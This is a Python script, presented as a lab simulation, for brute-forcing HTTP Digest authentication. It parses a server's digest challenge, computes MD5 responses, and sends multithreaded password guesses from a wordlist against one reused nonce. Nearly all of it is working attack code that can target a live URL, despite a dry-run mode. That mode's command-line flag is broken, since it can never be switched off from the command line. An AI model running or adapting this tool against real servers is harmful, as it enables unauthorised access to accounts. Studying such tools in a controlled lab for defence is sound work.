#!/usr/bin/env python3
"""
HTTP Digest Authentication Nonce Reuse Attack Tool (Lab Simulation)
Purpose: Demonstrate digest nonce reuse behavior in a safe lab environment.
Usage:
    python digest_nonce_reuse.py --dry-run --url http://localhost:8082/digestauth --user testuser --passwords file.txt
Example:
    python digest_nonce_reuse.py --dry-run
"""

import requests
import hashlib
import time
import re
import threading
import queue
import argparse

class DigestBurstAttacker:
    def __init__(self, url=None, username=None, password_list=None, dry_run=True):
        self.url = url if url else 'http://localhost/digestauth'
        self.username = username if username else 'testuser'
        self.session = requests.Session()
        self.dry_run = dry_run
        
        # This list should be populated from external sources (e.g., wordlists, cracked passwords)
        self.passwords = password_list if password_list else []
        
        # Filter passwords to ensure they meet common digest authentication criteria (e.g., 6-char alphanumeric)
        seen = set()
        filtered = []
        for p in self.passwords:
            if len(p) == 6 and p.isalnum() and p not in seen:
                seen.add(p)
                filtered.append(p)
        self.passwords = filtered
        
    def get_digest_challenge(self):
        """Get fresh digest challenge"""
        if self.dry_run:
            return {"realm": "lab", "nonce": "deadbeef", "qop": "auth", "algorithm": "MD5"}
        try:
            response = self.session.get(self.url, timeout=5)
            if response.status_code == 401:
                auth_header = response.headers.get('WWW-Authenticate', '')
                if 'Digest' in auth_header:
                    return self.parse_challenge(auth_header)
            return None
        except Exception as e:
            print(f"Error getting challenge: {e}")
            return None
    
    def parse_challenge(self, auth_header):
        """Parse digest challenge header"""
        challenge = {}
        
        # Extract realm
        realm_match = re.search(r'realm="([^"]*)"', auth_header)
        if realm_match:
            challenge['realm'] = realm_match.group(1)
        
        # Extract nonce  
        nonce_match = re.search(r'nonce="([^"]*)"', auth_header)
        if nonce_match:
            challenge['nonce'] = nonce_match.group(1)
        
        # Extract qop
        qop_match = re.search(r'qop="([^"]*)"', auth_header)
        if qop_match:
            challenge['qop'] = qop_match.group(1)
        
        # Extract algorithm
        alg_match = re.search(r'algorithm=([^,\s]*)', auth_header)
        challenge['algorithm'] = alg_match.group(1) if alg_match else 'MD5'
        
        return challenge if 'realm' in challenge and 'nonce' in challenge else None
    
    def create_digest_response(self, challenge, password, nc=1, cnonce="00000001"):
        """Create digest authentication response"""
        realm = challenge['realm']
        nonce = challenge['nonce']
        uri = re.search(r'(https?://[^/]+)(/.*)', self.url).group(2) if re.search(r'(https?://[^/]+)(/.*)', self.url) else '/'
        method = 'GET'
        qop = challenge.get('qop')
        
        # Create HA1
        ha1 = hashlib.md5(f"{self.username}:{realm}:{password}".encode()).hexdigest()
        
        # Create HA2
        ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
        
        # Create response
        if qop and 'auth' in qop:
            # With qop
            nc_str = f"{nc:08x}"
            response_data = f"{ha1}:{nonce}:{nc_str}:{cnonce}:{qop}:{ha2}"
            response_hash = hashlib.md5(response_data.encode()).hexdigest()
            
            auth_header = (
                          f'Digest username="{self.username}", ' 
                          f'realm="{realm}", ' 
                          f'nonce="{nonce}", ' 
                          f'uri="{uri}", ' 
                          f'response="{response_hash}", ' 
                          f'qop={qop}, ' 
                          f'nc={nc_str}, ' 
                          f'cnonce="{cnonce}"'
                          )
        else:
            # Without qop (legacy)
            response_data = f"{ha1}:{nonce}:{ha2}"
            response_hash = hashlib.md5(response_data.encode()).hexdigest()
            
            auth_header = (
                          f'Digest username="{self.username}", ' 
                          f'realm="{realm}", ' 
                          f'nonce="{nonce}", ' 
                          f'uri="{uri}", ' 
                          f'response="{response_hash}"'
                          )
        
        return auth_header
    
    def test_password_with_challenge(self, challenge, password):
        """Test a password with existing challenge"""
        if self.dry_run:
            return 401, 0
        try:
            auth_header = self.create_digest_response(challenge, password)
            
            response = self.session.get(
                self.url,
                headers={'Authorization': auth_header},
                timeout=5
            )
            
            return response.status_code, len(response.text) if response.text else 0
            
        except Exception as e:
            return None, str(e)
    
    def burst_attack_worker(self, challenge, password_queue, result_queue, worker_id):
        """Worker thread for burst attack"""
        while True:
            try:
                password = password_queue.get(timeout=1)
                status, content_len = self.test_password_with_challenge(challenge, password)
                
                result_queue.put((worker_id, password, status, content_len))
                
                if status == 200:
                    print(f"\n*** Worker {worker_id}: SUCCESS with password '{password}' ***")
                    # Signal other workers to stop
                    while not password_queue.empty():
                        try:
                            password_queue.get_nowait()
                        except:
                            break
                    break
                
                password_queue.task_done()
                time.sleep(0.1)
                
            except queue.Empty:
                break
            except Exception as e:
                result_queue.put((worker_id, password, f"ERROR: {e}", 0))
                password_queue.task_done()
    
    def run_burst_attack(self, num_workers=3):
        """Run burst attack with multiple workers reusing same nonce"""
        mode = "DRY-RUN" if self.dry_run else "ACTIVE"
        print(f"HTTP Digest Authentication Nonce Reuse Attack ({mode})")
        print("=" * 50)
        
        if not self.passwords:
            print("No passwords provided for testing. Exiting.")
            return False

        # Get fresh challenge
        print("Getting fresh digest challenge...")
        challenge = self.get_digest_challenge()
        if not challenge:
            print("Failed to get digest challenge")
            return False
        
        print(f"Challenge obtained:")
        print(f"  Realm: {challenge['realm']}")
        print(f"  Nonce: {challenge['nonce'][:20]}...")
        print(f"  QOP: {challenge.get('qop', 'none')}")
        print(f"  Algorithm: {challenge.get('algorithm', 'MD5')}")
        print()
        
        # Setup queues
        password_queue = queue.Queue()
        result_queue = queue.Queue()
        
        # Add passwords to queue
        for password in self.passwords:
            password_queue.put(password)
        
        print(f"Testing {password_queue.qsize()} passwords with {num_workers} workers...")
        print("Starting burst attack with nonce reuse...")
        print()
        
        # Start worker threads
        workers = []
        start_time = time.time()
        
        for i in range(num_workers):
            worker = threading.Thread(
                target=self.burst_attack_worker,
                args=(challenge, password_queue, result_queue, i+1)
            )
            worker.daemon = True
            worker.start()
            workers.append(worker)
        
        # Monitor results
        success_found = False
        tested_passwords = 0
        
        while any(w.is_alive() for w in workers) or not result_queue.empty():
            try:
                worker_id, password, status, content_len = result_queue.get(timeout=1)
                tested_passwords += 1
                
                if status == 200:
                    print(f"*** SUCCESS! Password found: {password} ***")
                    print(f"Worker {worker_id} authenticated successfully")
                    print(f"Content length: {content_len}")
                    success_found = True
                    break
                elif isinstance(status, int):
                    if tested_passwords % 10 == 0:
                        elapsed = time.time() - start_time
                        rate = tested_passwords / elapsed if elapsed > 0 else 0
                        print(f"[{tested_passwords:3d}] Worker {worker_id}: {password} -> {status} ({rate:.1f} tests/sec)")
                else:
                    print(f"[ERR] Worker {worker_id}: {password} -> {status}")
                
            except queue.Empty:
                continue
        
        for worker in workers:
            worker.join(timeout=1)
        
        elapsed = time.time() - start_time
        print(f"\nBurst attack completed in {elapsed:.1f} seconds")
        if elapsed > 0:
            print(f"Tested {tested_passwords} passwords at {tested_passwords/elapsed:.1f} tests/sec")
        
        return success_found


def _parse_cli_args():
    parser = argparse.ArgumentParser(description="Digest nonce reuse demo (lab-only)")
    parser.add_argument("--url", type=str, default="http://localhost:8082/digestauth")
    parser.add_argument("--user", type=str, default="testuser")
    parser.add_argument("--passwords", type=str, default="")
    parser.add_argument("--dry-run", action="store_true", default=True)
    parser.add_argument("--workers", type=int, default=3)
    return parser.parse_args()


if __name__ == "__main__":
    args = _parse_cli_args()
    pwds = []
    if args.passwords:
        try:
            with open(args.passwords, "r", encoding="utf-8") as fh:
                pwds = [line.strip() for line in fh if line.strip()]
        except Exception as e:
            print(f"Could not read passwords file: {e}")
    attacker = DigestBurstAttacker(url=args.url, username=args.user, password_list=pwds, dry_run=args.dry_run)
    attacker.run_burst_attack(num_workers=args.workers)
